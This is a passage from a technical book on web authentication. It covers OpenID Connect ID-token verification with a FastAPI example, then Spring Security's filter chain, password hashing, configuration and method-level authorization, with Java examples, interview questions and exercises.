        │                    │     id_token (NEW vs Ch.9)         │
        │                    │ <────────────────────────────│
        │                    │                          │
        │                    │  6. VERIFY id_token signature,     │
        │                    │     iss, aud, exp (Ch.8 mechanics)  │
        │                    │  7. Extract "sub" -> this IS the     │
        │                    │     user's stable identity in         │
        │                    │     YOUR app now                      │
        │                    │                          │
        │                    │  8. (optional) call UserInfo          │
        │                    │     using access_token for            │
        │                    │     more profile fields                 │
```

Step 6–7 is the entire payoff of this chapter: your application now has a **verified, standardized, stable identity** for the user — something Chapter 9's plain OAuth flow never actually gave you.

---

## 10.7 Reference implementation (Python / FastAPI)

Extending the Chapter 9 client example with the OIDC-specific pieces:

```python
import secrets
from urllib.parse import urlencode

import httpx
import jwt   # PyJWT, same library from Chapter 8
from jwt import PyJWKClient
from fastapi import HTTPException
from fastapi.responses import RedirectResponse

CLIENT_ID = "photoprintsite-12345"
CLIENT_SECRET = "GOCSPX-verysecretvalue"
REDIRECT_URI = "https://photoprintsite.com/oauth/callback"
DISCOVERY_URL = "https://accounts.google.com/.well-known/openid-configuration"

async def get_provider_config() -> dict:
    # Section 10.4 — fetch endpoints dynamically rather than hardcoding them
    async with httpx.AsyncClient() as client:
        resp = await client.get(DISCOVERY_URL)
        return resp.json()

@app.get("/login")
async def login():
    config = await get_provider_config()
    state = secrets.token_urlsafe(16)
    PENDING_STATES.add(state)
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": "openid email profile",   # "openid" is what makes this OIDC, not plain OAuth
        "state": state,
    }
    # urlencode is REQUIRED here, not optional: the scope value contains
    # spaces, which a hand-built query string would emit raw and break.
    return RedirectResponse(f"{config['authorization_endpoint']}?{urlencode(params)}")

@app.get("/oauth/callback")
async def callback(code: str, state: str):
    if state not in PENDING_STATES:
        raise HTTPException(status_code=400, detail="invalid_state")
    PENDING_STATES.discard(state)

    config = await get_provider_config()
    async with httpx.AsyncClient() as client:
        token_resp = await client.post(config["token_endpoint"], data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
        })
    tokens = token_resp.json()
    id_token = tokens["id_token"]

    # Section 10.3 — verify the ID token using Chapter 8's exact JWT
    # verification mechanics, but with the public key fetched dynamically
    # via jwks_uri (section 10.4) since we're verifying a token WE didn't
    # issue, signed with Google's PRIVATE key (RS256, section 8.5).
    jwk_client = PyJWKClient(config["jwks_uri"])
    signing_key = jwk_client.get_signing_key_from_jwt(id_token)
    claims = jwt.decode(
        id_token,
        signing_key.key,
        algorithms=["RS256"],
        audience=CLIENT_ID,                 # must match OUR client_id
        issuer=config["issuer"],             # must match the expected provider
    )

    user_id = claims["sub"]        # THIS is the durable, verified identity
    email = claims.get("email")

    # From here: create or look up a local user record keyed on
    # (issuer, sub), and start a session for them (Chapter 7) —
    # OIDC's job (proving identity) is now complete; everything
    # after this point is your own app's session management.
    return {"message": f"Welcome, {claims.get('name')}", "user_id": user_id}
```

**What's happening internally:** `PyJWKClient` fetches and caches the provider's public signing keys from `jwks_uri`, then `jwt.decode(..., audience=..., issuer=...)` performs the *exact* signature/expiration verification from Chapter 8, plus the two OIDC-specific checks (`aud` matches our own client, `iss` matches the expected provider) — closing the loop from section 10.3's warning about token replay across applications.

---

## 10.8 Google, Microsoft, and GitHub Login — practical notes

All three are, at their core, the exact same flow from section 10.6 — the differences are almost entirely in registration details and minor claim naming, not in the underlying mechanism:

| Provider | Discovery URL | Notes |
|---|---|---|
| **Google** | `https://accounts.google.com/.well-known/openid-configuration` | Fully standard OIDC; `email_verified` claim is reliable and commonly checked |
| **Microsoft (Entra ID / Azure AD)** | `https://login.microsoftonline.com/{tenant}/v2.0/.well-known/openid-configuration` | Requires a specific `{tenant}` in the URL (or `common` for multi-tenant apps); otherwise standard OIDC |
| **GitHub** | *No standard OIDC discovery/ID Token* | GitHub's OAuth implementation predates and does not implement OIDC — it's plain OAuth 2.0 (Chapter 9) only; identity must be fetched via GitHub's own `GET /user` REST API using the access token, not a standardized ID Token |

> **Common Mistake:** Assuming every "Sign in with X" provider is OIDC-compliant. As the table shows, GitHub is a real, common counter-example — Chapter 9's mini project deliberately used GitHub specifically to demonstrate the plain-OAuth (no ID Token, no standardized identity claims) case; this chapter's mini project below intentionally contrasts it with a true OIDC provider so you feel the difference directly.

---

## 10.9 Security considerations

- **Always verify `iss` and `aud`** on the ID Token, not just the signature — a validly-signed token issued by the correct provider but intended for a *different* application must still be rejected (section 10.3).
- **Never treat the access token as an identity claim** — restated because it is the single most common OIDC implementation mistake (section 10.3).
- **Use the `sub` claim, not `email`, as your durable user key** — a user's email can change (they update it with the provider) or, on rare occasions, even be reused across different underlying accounts; `sub` is defined by the specification to be stable for a given issuer.
- **Validate `email_verified` if your logic depends on trusting the email**, e.g., before treating a login as sufficient proof to link to an existing account by email address — an unverified email claim shouldn't be trusted for account-linking decisions.

---

## Chapter 10 Summary

- **OAuth 2.0 alone doesn't standardize identity** — an access token proves authorized access, not who the user is; **OIDC adds a thin, standardized identity layer on top of OAuth**, reusing its flows unchanged.
- OIDC adds exactly three things: the **ID Token** (a JWT with standardized identity claims), the **`openid` scope**, and the **UserInfo endpoint**.
- The **ID Token**'s `sub` claim is the durable, verified user identity your app should key on — never the access token, and generally not the email.
- The **Discovery Endpoint** (`/.well-known/openid-configuration`) lets clients dynamically fetch every needed endpoint and the `jwks_uri` for signature verification, rather than hardcoding them.
- ID Token verification reuses Chapter 8's JWT mechanics exactly, plus two OIDC-specific checks: `iss` matches the expected provider, `aud` matches your own `client_id`.
- **Google and Microsoft are standard OIDC providers; GitHub is not** — it's plain OAuth only, a useful, real contrast to internalize.

---

## Interview Questions — Chapter 10

**Q1. In one precise sentence, what's the difference between OAuth 2.0 and OpenID Connect?**
OAuth 2.0 is an authorization framework for granting a client limited access to a resource; OpenID Connect is a standardized identity layer built directly on top of OAuth 2.0's existing flows, adding the ID Token so a client can reliably learn who the authenticated user actually is.

**Q2. Why shouldn't a client use the OAuth access token to determine the logged-in user's identity?**
Because the access token's format and contents are not standardized by OAuth for identity purposes — it may be entirely opaque (a random lookup string, as with API keys in Chapter 6) and carries no guaranteed identity claims. The ID Token is specifically designed and standardized for this purpose; the access token's job is calling the resource server, nothing more.

**Q3. What two additional checks does ID Token verification require beyond standard JWT signature/expiration verification, and why does each matter?**
Checking `iss` matches the expected provider (confirms the token actually came from who you think it did) and `aud` matches your own `client_id` (confirms the token was issued *for your application specifically*, preventing a validly-signed token intended for a different app from being replayed against yours).

**Q4. What is the Discovery Endpoint, and what practical problem does it solve?**
A standardized, well-known URL (`/.well-known/openid-configuration`) that returns a provider's authorization endpoint, token endpoint, UserInfo endpoint, and JWKS URI (for signature verification) in one document. It solves the problem of hardcoding and manually maintaining multiple provider-specific URLs, and lets clients automatically stay current as a provider rotates its signing keys.

**Q5. Why is `sub` preferred over `email` as the key for a user's account in your own database?**
`sub` is defined by the OIDC specification to be a stable, durable identifier for a given user at a given issuer. Email addresses can change, and in rare cases could be reassigned or reused, making them an unreliable long-term primary key compared to the provider-guaranteed stability of `sub`.

---

## Hands-On Exercises — Chapter 10

1. Fetch Google's Discovery Endpoint (`https://accounts.google.com/.well-known/openid-configuration`) with `curl` and identify the `authorization_endpoint`, `token_endpoint`, and `jwks_uri` values in the raw JSON response.
2. Run the FastAPI OIDC client from section 10.7 against a real Google OAuth app (free to register) and print the fully decoded ID Token claims after a successful login — identify `iss`, `sub`, `aud`, and `email` in the output.
3. Deliberately change the `audience` parameter passed to `jwt.decode(...)` in section 10.7 to a wrong value and confirm verification now fails — explain, in your own words, what real-world attack this check prevents.
4. Compare, in writing, GitHub's `GET /user` response (from Chapter 9's mini project) against a decoded Google ID Token's claims — identify at least two standardized OIDC claims Google provides that GitHub's plain-OAuth response has no standardized equivalent for.

## Mini Project — Chapter 10

Extend Chapter 9's GitHub-login mini project by adding a **true OIDC** "Sign in with Google" option to the same app, so both exist side by side.

Requirements:
- `/login/google` and `/login/github` as two separate entry points, both landing on a shared `/dashboard` once authenticated.
- For Google: full ID Token verification per section 10.7 (signature, `iss`, `aud`, `exp`), storing the user keyed by `sub`.
- For GitHub: continue using the `GET /user` API call from Chapter 9's approach, storing the user keyed by GitHub's numeric user ID (its closest equivalent to `sub`, despite not being a formal OIDC claim).
- A short written reflection (5+ sentences) on which integration required more custom code and why, tying your answer explicitly back to section 10.8's provider comparison.

---

## Preparing for Chapter 11

We've now covered every major *scheme* this book set out to teach (Basic, API Keys, Sessions, JWT, OAuth, OIDC) from first principles, at the protocol level, using framework-agnostic and dual-implementation examples throughout. Chapter 11 goes deep on exactly one of those two implementation stacks — **Spring Security** — showing precisely how its filter chain, `AuthenticationManager`, `UserDetailsService`, and method-level security annotations tie together everything from Chapters 3 through 9 into one coherent, production-grade framework.

---

*End of Chapter 10.*

---

# Chapter 11 — Authentication in Spring Security

## 11.0 Where we left off

Every chapter from 5 onward showed you a Spring Boot snippet with a note attached: *"Chapter 11 explains what this is actually doing."* This chapter pays off all of those at once. You have already met, piecemeal, `SecurityFilterChain` (Ch. 5), `OncePerRequestFilter` (Ch. 6, 8), `UserDetailsService` (Ch. 5), `PasswordEncoder` (Ch. 5), and `SecurityContextHolder` (Ch. 6, 8). Now we assemble them into one coherent mental model.

The single most important thing to understand about Spring Security is this: **it is not a library of helper functions you call. It is a chain of servlet filters that runs *before* your controller code exists in the picture at all.** Almost every confusing Spring Security behaviour — "why is my endpoint returning 403 when I never wrote a 403?", "why does my `@GetMapping` never get hit?" — makes immediate sense once you internalize that.

By the end of this chapter you will be able to read a `SecurityConfig` class and predict exactly what happens to any given request.

---

## 11.1 The Security Filter Chain

**Simple explanation:** Before your controller runs, the request passes through a line of inspectors. Each one looks at the request, may modify it, may reject it outright, and otherwise passes it to the next one.

**Technical definition:** Spring Security registers a single servlet `Filter` (`springSecurityFilterChain`, wrapped by `DelegatingFilterProxy`) into the servlet container. That one filter delegates to an ordered list of `SecurityFilterChain` beans; the first chain whose request-matcher matches handles the request, running its own ordered list of individual security filters.

**Real-world analogy — airport security:**

```
   You (the request) walk toward the gate (your controller).
   You do not get there directly. You pass, in a fixed order, through:

     1. Document check      ("do you have a boarding pass at all?")
     2. ID verification      ("is this really you?")           <- AUTHENTICATION
     3. Security screening   ("are you allowed to bring that?")  <- AUTHORIZATION
     4. Gate agent           ("this flight, this seat")           <- your controller

   Any station can stop you and send you back. If station 2 rejects you,
   station 3 never happens — and the gate agent never knew you existed.
```

**The chain, concretely** (abbreviated to the filters that matter for this book, in actual execution order):

```
   HTTP Request
        │
        ▼
 ┌────────────────────────────────────────────────────────────┐
 │  SecurityContextHolderFilter                                  │
 │    Loads any existing SecurityContext for this request         │
 ├────────────────────────────────────────────────────────────┤
 │  CorsFilter                    (Ch. 12 — cross-origin rules)   │
 ├────────────────────────────────────────────────────────────┤
 │  CsrfFilter                    (Ch. 7, 12 — CSRF tokens)        │
 ├────────────────────────────────────────────────────────────┤
 │  ★ YOUR CUSTOM FILTERS GO HERE  (JwtAuthFilter, Ch. 8;          │
 │                                   ApiKeyAuthFilter, Ch. 6)       │
 ├────────────────────────────────────────────────────────────┤
 │  UsernamePasswordAuthenticationFilter   (form login)             │
 ├────────────────────────────────────────────────────────────┤
 │  BasicAuthenticationFilter     (Ch. 5 — this is what             │
 │                                 .httpBasic() switched on)         │
 ├────────────────────────────────────────────────────────────┤
 │  ExceptionTranslationFilter                                       │
 │    Turns thrown security exceptions into 401 / 403 responses       │
 ├────────────────────────────────────────────────────────────┤
 │  AuthorizationFilter                                               │
 │    Enforces .authorizeHttpRequests(...) rules  <- LAST filter        │
 └────────────────────────────────────────────────────────────┘
        │
        ▼
   DispatcherServlet ──> Your @RestController
```

> **Remember:** Authentication filters run **early**; the `AuthorizationFilter` runs **last**, immediately before your controller. That ordering *is* Chapter 3's "authentication first, then authorization" principle, expressed as executable infrastructure. Note also that an authentication filter's job is only to *populate* the security context if a credential is present — it does **not** reject anonymous requests. Rejection happens later, at `AuthorizationFilter`. This surprises people constantly, and it explains the single most common Spring Security bug, covered in section 11.10.

---

## 11.2 The core objects, and how they connect

Five types do almost all the work. Learn them as a pipeline, not as a list.

| Type | One-line job |
|---|---|
| `Authentication` | A token object representing "who is asking" — before verification it holds a *claim*; after verification it holds a *verified identity* |
| `AuthenticationManager` | The entry point: "verify this `Authentication`, or throw" |
| `AuthenticationProvider` | A strategy that knows how to verify *one particular kind* of credential |
| `UserDetailsService` | Loads user data (username, password hash, authorities) from your storage |
| `PasswordEncoder` | Hashes a raw password, and checks a raw password against a stored hash |

**How they connect:**

```
   BasicAuthenticationFilter (or your custom filter)
        │
        │  builds an UNAUTHENTICATED Authentication object:
        │  UsernamePasswordAuthenticationToken("anuj", "secret123")
        ▼
   AuthenticationManager  (implementation: ProviderManager)
        │
        │  asks each registered provider: "can you handle this type?"
        ▼
   DaoAuthenticationProvider   (the standard username/password provider)
        │
        ├──> UserDetailsService.loadUserByUsername("anuj")
        │         └──> returns UserDetails { username, passwordHash, authorities }
        │              (or throws UsernameNotFoundException)
        │
        └──> PasswordEncoder.matches("secret123", storedHash)
                  │
                  ├── false ──> throw BadCredentialsException ──> 401
                  └── true  ──> return an AUTHENTICATED Authentication
                                 (credentials erased, authorities populated)
        │
        ▼
   SecurityContextHolder.getContext().setAuthentication(authenticated)
        │
        ▼
   ...rest of the filter chain, then your controller
```

> **Interview Tip:** A very common question is *"walk me through what happens when a user logs in with Spring Security."* Reciting the diagram above — filter builds an unauthenticated token → `AuthenticationManager` → `AuthenticationProvider` → `UserDetailsService` + `PasswordEncoder` → authenticated token stored in `SecurityContextHolder` — is a complete, senior-level answer. Most candidates can only say "Spring Security handles it."

---

## 11.3 `UserDetailsService` — connecting to your real database

Chapter 5 used `InMemoryUserDetailsManager`, which is fine for a demo and wrong for anything real. Here is the production shape.

```java
// 1. Your own JPA entity — your table, your columns, your business fields.
@Entity
@Table(name = "users")
public class UserEntity {
    @Id @GeneratedValue
    private Long id;

    @Column(unique = true, nullable = false)
    private String email;

    @Column(nullable = false)
    private String passwordHash;      // BCrypt output — NEVER a plaintext password

    @Enumerated(EnumType.STRING)
    private Role role;                 // e.g. CUSTOMER, BANK_STAFF, ADMIN

    private boolean enabled = true;    // lets you disable an account without deleting it
    // getters/setters omitted
}

// 2. The adapter: translate YOUR entity into what Spring Security understands.
@Service
public class DatabaseUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    public DatabaseUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {
        UserEntity user = userRepository.findByEmail(email)
            // Throwing here produces a 401, NOT a 404 — "no such user" and
            // "wrong password" must be indistinguishable to the caller.
            // See section 11.11 (user enumeration).
            .orElseThrow(() -> new UsernameNotFoundException("Invalid credentials"));

        return User.builder()
            .username(user.getEmail())
            .password(user.getPasswordHash())   // the HASH, not a raw password
            // "ROLE_" prefix matters: hasRole("ADMIN") looks for "ROLE_ADMIN".
            // .roles(...) adds the prefix for you; .authorities(...) does not.
            .roles(user.getRole().name())
            .disabled(!user.isEnabled())
            .build();
    }
}
```

**What's happening internally:** `UserDetailsService` is a single-method interface whose *only* job is "given a username, return the stored credential and authorities, or throw." It performs **no** password comparison — that is `PasswordEncoder`'s job, invoked by `DaoAuthenticationProvider` *after* this method returns. Keeping the two separate is what lets you swap storage (JPA, LDAP, a REST call to another service) without touching password-verification logic, and swap hashing algorithms without touching storage.

> **Common Mistake:** comparing the password inside `loadUserByUsername` and returning `null` when it doesn't match. `UserDetailsService` must return the stored user or throw — never `null` (which causes a confusing `NullPointerException` deep inside the provider) and never a password comparison. If you find yourself needing the raw password in this method, you have the design inverted.

---

## 11.4 `PasswordEncoder` and BCrypt

Chapter 5 introduced password hashing as a principle; Chapter 12 covers the cryptography. Here is the Spring-specific mechanics.

```java
@Bean
public PasswordEncoder passwordEncoder() {
    // The number is the "strength" / cost factor: BCrypt runs 2^strength
    // rounds. 10 is the default; 12 is a reasonable modern choice.
    // Higher = slower = harder to brute-force, but also slower for YOUR
    // login endpoint. Measure it: aim for roughly 250-500ms per hash.
    return new BCryptPasswordEncoder(12);
}
```

**Registration (hashing) and login (verifying):**

```java
// REGISTRATION — hash once, store the hash
String hash = passwordEncoder.encode(rawPasswordFromRequest);
userRepository.save(new UserEntity(email, hash, Role.CUSTOMER));

// LOGIN — you normally never write this; DaoAuthenticationProvider does it.
boolean ok = passwordEncoder.matches(rawPasswordFromRequest, user.getPasswordHash());
```

**Why you never need to manage a salt yourself:** BCrypt embeds the salt *inside* the output string. A stored hash looks like:

```
   $2a$12$N9qo8uLOickgx2ZMRZoMye.IjZAgcfl7p92ldGxad68LJZdL17lhWy
   └┬┘ └┬┘ └──────────────────┬─────────────────┘└──────┬──────┘
   alg cost      salt (22 chars, base64-ish)         hash (31 chars)
```

`matches()` reads the cost and salt back out of the stored string, re-hashes the supplied password with exactly those parameters, and compares in constant time. This is why the same password hashed twice produces two different strings — and why you must **never** compare password hashes with `equals()`.

> **Common Mistake — the `IllegalArgumentException: There is no PasswordEncoder mapped for the id "null"` error.** This means a stored password is not in Spring's expected `{id}hash` delegating format — nearly always because plaintext passwords were inserted directly into the database (via a SQL seed script or a test fixture). The fix is to hash them, not to switch to `NoOpPasswordEncoder`. `NoOpPasswordEncoder` exists solely for legacy migration, is deprecated, and storing plaintext passwords is exactly what Chapter 5, section 5.7 forbids.

---

## 11.5 A complete, modern `SecurityConfig`

This is the Spring Security 6 / Spring Boot 3 style (lambda DSL, no `WebSecurityConfigurerAdapter` — that class was **removed**, not merely deprecated, so pre-2022 tutorials will not compile).

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity              // switches on @PreAuthorize (section 11.8)
public class SecurityConfig {

    private final JwtAuthFilter jwtAuthFilter;          // from Chapter 8
    private final UserDetailsService userDetailsService; // from section 11.3

    public SecurityConfig(JwtAuthFilter jwtAuthFilter,
                          UserDetailsService userDetailsService) {
        this.jwtAuthFilter = jwtAuthFilter;
        this.userDetailsService = userDetailsService;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // 1. CSRF: disabled ONLY because this is a stateless, token-based
            //    API where no cookie is auto-attached (Chapter 7, section 7.8).
            //    If you serve browser sessions via cookies, DO NOT disable this.
            .csrf(csrf -> csrf.disable())

            // 2. No server-side session at all — every request re-authenticates
            //    from its JWT (Chapter 8, section 8.12).
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // 3. Authorization rules, evaluated TOP TO BOTTOM — first match wins.
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**", "/actuator/health").permitAll()
                .requestMatchers(HttpMethod.GET, "/api/books/**").hasAnyRole("CUSTOMER", "ADMIN")
                .requestMatchers(HttpMethod.DELETE, "/api/books/**").hasRole("ADMIN")
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                // The catch-all MUST be last, and must be deny-by-default.
                .anyRequest().authenticated()
            )

            // 4. Our JWT filter runs before the username/password filter,
            //    so a valid token populates the SecurityContext in time for
            //    the AuthorizationFilter to evaluate the rules above.
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)

            // 5. What to do when authentication/authorization fails.
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, e) -> {
                    // No or invalid credentials -> 401 (Chapter 3)
                    res.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                    res.setContentType("application/json");
                    res.getWriter().write("{\"error\":\"unauthorized\"}");
                })
                .accessDeniedHandler((req, res, e) -> {
                    // Known identity, insufficient permission -> 403 (Chapter 3)
                    res.setStatus(HttpServletResponse.SC_FORBIDDEN);
                    res.setContentType("application/json");
                    res.getWriter().write("{\"error\":\"forbidden\"}");
                })
            );

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        // Exposing this bean is what lets your /login controller call
        // authenticationManager.authenticate(...) directly — see 11.7.
        return config.getAuthenticationManager();
    }
}
```

> **Remember — rule order is not cosmetic.** `authorizeHttpRequests` matches **top to bottom, first match wins**. Putting `.anyRequest().permitAll()` first makes every rule below it dead code and opens your entire API. Putting the specific rules first and `.anyRequest().authenticated()` last is the deny-by-default posture Chapter 2, section 2.8 called "fail closed."

---

## 11.6 `hasRole` vs `hasAuthority` — the `ROLE_` prefix trap

This costs people hours, so it gets its own section.

| Method | What it actually checks |
|---|---|
| `hasRole("ADMIN")` | Looks for the authority string **`ROLE_ADMIN`** — it silently adds the prefix |
| `hasAuthority("ADMIN")` | Looks for the authority string **`ADMIN`** — exactly as written, no prefix |
| `.roles("ADMIN")` (builder) | Stores the authority as **`ROLE_ADMIN`** — adds the prefix |
| `.authorities("ADMIN")` (builder) | Stores the authority as **`ADMIN`** — no prefix |

```java
// ✅ CONSISTENT — both sides use the role convention
.roles("ADMIN")            +   .hasRole("ADMIN")          // stores ROLE_ADMIN, checks ROLE_ADMIN

// ✅ CONSISTENT — both sides use raw authorities
.authorities("ADMIN")      +   .hasAuthority("ADMIN")      // stores ADMIN, checks ADMIN

// ❌ BROKEN — always 403, with no error message explaining why
.authorities("ADMIN")      +   .hasRole("ADMIN")           // stores ADMIN, looks for ROLE_ADMIN
```

The third case is the trap: authentication succeeds, the user genuinely has the admin authority, and every request still returns `403 Forbidden` with no clue as to why. If you are staring at an inexplicable 403, print the actual authorities first:

```java
System.out.println(SecurityContextHolder.getContext().getAuthentication().getAuthorities());
// [ROLE_ADMIN]   <- or [ADMIN], and now you know which check to use
```

> **Interview Tip:** *"What's the difference between a role and an authority in Spring Security?"* The honest answer: **technically nothing** — a role *is* an authority that carries the `ROLE_` prefix by convention. The useful follow-up, connecting to Chapter 3, section 3.4: roles are coarse bundles (`ROLE_ADMIN`), authorities are typically used for granular permissions (`book:delete`), and the guidance from Chapter 3 — check permissions rather than role names in business logic — argues for `hasAuthority("book:delete")` over `hasRole("ADMIN")` wherever the check is about *what may be done* rather than *who someone is*.

---

## 11.7 The login endpoint — using `AuthenticationManager` directly

With a stateless JWT API there is no form login; you write a `/login` controller that verifies credentials and mints a token. This is where the `AuthenticationManager` bean from 11.5 earns its keep.

```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {

    private final AuthenticationManager authenticationManager;
    private final JwtService jwtService;               // from Chapter 8, section 8.13

    @PostMapping("/login")
    public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request) {
        try {
            // Delegating to AuthenticationManager means you reuse the EXACT
            // same verification path (UserDetailsService + PasswordEncoder,
            // account-disabled checks, lockout) that the filter chain uses.
            // Hand-rolling `if (encoder.matches(...))` here is how the two
            // paths drift apart and a disabled account stays able to log in.
            Authentication auth = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(request.email(), request.password())
            );

            UserDetails user = (UserDetails) auth.getPrincipal();
            String role = user.getAuthorities().iterator().next().getAuthority();

            return ResponseEntity.ok(Map.of(
                "access_token", jwtService.createAccessToken(user.getUsername(), role),
                "token_type", "Bearer",
                "expires_in", 900
            ));

        } catch (BadCredentialsException | UsernameNotFoundException e) {
            // ONE generic message for both cases — section 11.11.
            return ResponseEntity.status(401).body(Map.of("error", "Invalid credentials"));
        } catch (DisabledException e) {
            return ResponseEntity.status(403).body(Map.of("error", "Account disabled"));
        }
    }
}

public record LoginRequest(
    @NotBlank @Email String email,
    @NotBlank @Size(min = 8) String password
) {}
```

---

## 11.8 Method Security — authorization next to the business logic

Section 11.5 configured authorization by **URL pattern**. That works for coarse rules but breaks down for the resource-specific checks Chapter 3 described ("is this user the *owner* of *this particular* account?"), because a URL pattern cannot see the data. `@EnableMethodSecurity` enables annotations that can.

```java
@RestController
@RequestMapping("/api/accounts")
public class AccountController {

    // Simple role check, evaluated BEFORE the method body runs.
    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping
    public List<Account> listAllAccounts() { ... }

    // Granular permission check — the Chapter 3, section 3.4 preference.
    @PreAuthorize("hasAuthority('account:freeze')")
    @PostMapping("/{id}/freeze")
    public void freeze(@PathVariable Long id) { ... }

    // Ownership check: compare a method ARGUMENT against the caller's identity.
    // #id refers to the method parameter; authentication.name is the JWT subject.
    @PreAuthorize("#id == authentication.name or hasRole('BANK_STAFF')")
    @GetMapping("/{id}")
    public Account getAccount(@PathVariable String id) { ... }

    // Delegate to your own bean for anything non-trivial — SpEL expressions
    // that grow past one line become untestable and unreadable.
    @PreAuthorize("@accountSecurity.canAccess(authentication, #id)")
    @GetMapping("/{id}/transactions")
    public List<Transaction> transactions(@PathVariable Long id) { ... }
}

@Component("accountSecurity")
public class AccountSecurity {
    private final AccountRepository accounts;

    public boolean canAccess(Authentication auth, Long accountId) {
        // Plain Java: unit-testable, debuggable, breakpoint-able.
        return accounts.findById(accountId)
            .map(a -> a.getOwnerEmail().equals(auth.getName())
                   || auth.getAuthorities().stream()
                          .anyMatch(g -> g.getAuthority().equals("ROLE_BANK_STAFF")))
            .orElse(false);
    }
}
```

| Annotation | When it runs | Typical use |
|---|---|---|
| `@PreAuthorize` | Before the method body | Almost always what you want |
| `@PostAuthorize` | After the method returns, can inspect the return value via `returnObject` | Rare — the work is already done, and side effects have already happened |
| `@PreFilter` / `@PostFilter` | Filters elements out of a collection argument / return value | Convenient, but filters in memory — it fetched every row first |

> **Common Mistake:** relying on `@PostFilter` to hide rows the user may not see. It works, but the query already returned every row to your application, so it does not scale and it can leak through logs, metrics, or a `count`. Filter in the **query** (`WHERE owner_id = :callerId`), and use annotations for the yes/no decision.

> **Common Mistake — self-invocation silently skips the check.** `@PreAuthorize` is implemented with a **proxy**. Calling an annotated method from *another method of the same class* (`this.freeze(id)`) bypasses the proxy entirely, so **no authorization check runs at all**. This is the same proxy limitation as `@Transactional`, and it fails silently. Call annotated methods from a *different* bean.

---

## 11.9 Custom authentication — plugging in your own scheme

When your credential is not a username/password (an API key from Chapter 6, an HMAC-signed request, a hardware token), you have two options. Pick by how much of Spring's machinery you need.

**Option A — a custom filter** (what Chapters 6 and 8 used). Simplest; you verify the credential yourself and populate the context:

```java
@Component
public class ApiKeyAuthFilter extends OncePerRequestFilter {

    private final ApiKeyService apiKeyService;

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                     FilterChain chain) throws IOException, ServletException {
        String key = req.getHeader("X-API-Key");

        if (key != null) {
            apiKeyService.verify(key).ifPresent(record -> {
                var auth = new UsernamePasswordAuthenticationToken(
                    record.getOwner(), null,
                    List.of(new SimpleGrantedAuthority("ROLE_SERVICE")));
                auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(req));
                SecurityContextHolder.getContext().setAuthentication(auth);
            });
        }

        // ALWAYS continue the chain. Do not reject here for a missing key —
        // let AuthorizationFilter decide, so that permitAll() endpoints
        // still work and 401/403 handling stays in one place (section 11.5).
        chain.doFilter(req, res);
    }
}
```

> **Common Mistake:** the version in Chapter 6, section 6.8 returns `401` directly from the filter when the header is absent. That is fine for a demo where every endpoint needs a key, but in a real app it breaks `/health` and `/login` — the filter fires before the authorization rules are consulted, so `permitAll()` never gets a say. Prefer the shape above: **authenticate if you can, and let the `AuthorizationFilter` reject.**

**Option B — a custom `AuthenticationProvider`.** More ceremony, but it plugs into `AuthenticationManager` so you inherit the standard exception handling, event publishing, and provider chaining:

```java
@Component
public class ApiKeyAuthenticationProvider implements AuthenticationProvider {

    @Override
    public Authentication authenticate(Authentication authentication) {
        String key = (String) authentication.getCredentials();
        return apiKeyService.verify(key)
            .map(rec -> (Authentication) new ApiKeyAuthenticationToken(
                rec.getOwner(), List.of(new SimpleGrantedAuthority("ROLE_SERVICE"))))
            .orElseThrow(() -> new BadCredentialsException("Invalid API key"));
    }

    @Override
    public boolean supports(Class<?> authentication) {
        // Tells ProviderManager which token types this provider handles.
        return ApiKeyAuthenticationToken.class.isAssignableFrom(authentication);
    }
}
```

---

## 11.10 What actually happens to a request — end to end

Tracing one real request through everything above:

```
   GET /api/books/1
   Authorization: Bearer eyJhbGci...
        │
        ▼
 [SecurityContextHolderFilter]  no existing context (stateless) -> empty
        │
        ▼
 [JwtAuthFilter]  (ours, section 11.5 step 4)
        │  - reads the Authorization header
        │  - jwtService.verifyToken(...) -> signature + exp valid (Ch. 8)
        │  - builds an authenticated token with ROLE_CUSTOMER
        │  - SecurityContextHolder.setAuthentication(...)
        │  - chain.doFilter(...)   <- ALWAYS continues
        ▼
 [AuthorizationFilter]
        │  - rule: GET /api/books/** -> hasAnyRole("CUSTOMER","ADMIN")
        │  - context holds ROLE_CUSTOMER -> ✅ granted
        ▼
 [DispatcherServlet] -> BookController.getBook(1)
        │
        │  @PreAuthorize on the method, if present, evaluated here
        ▼
   200 OK

   ---- FAILURE PATHS ----

   No header at all      -> context stays empty
                          -> AuthorizationFilter denies
                          -> AuthenticationEntryPoint -> 401   ("who are you?")

   Valid token, wrong role -> context holds ROLE_CUSTOMER
                          -> DELETE rule needs ROLE_ADMIN
                          -> AccessDeniedHandler -> 403        ("known, not allowed")
```

That 401-vs-403 split is decided *entirely* by whether `SecurityContextHolder` held an authenticated principal when `AuthorizationFilter` ran — which is exactly Chapter 3's distinction, mechanized.

---

## 11.11 Security concerns specific to Spring Security

- **Do not disable CSRF reflexively.** `.csrf(csrf -> csrf.disable())` is correct for a stateless, `Authorization`-header API (nothing is auto-attached, so there is nothing to forge — Chapter 7, section 7.8). It is **dangerous** the moment any authentication relies on a cookie. Disabling it "because the tutorial did" on a cookie-session app reintroduces the whole CSRF class.
